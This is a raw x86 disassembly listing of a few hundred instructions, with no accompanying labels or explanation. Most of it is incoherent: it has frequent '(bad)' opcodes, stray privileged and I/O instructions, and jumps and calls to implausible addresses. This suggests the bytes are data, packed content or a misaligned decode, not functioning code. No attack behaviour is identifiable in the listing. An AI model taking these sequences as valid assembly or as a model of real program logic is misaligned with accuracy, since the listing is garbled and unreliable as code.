  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
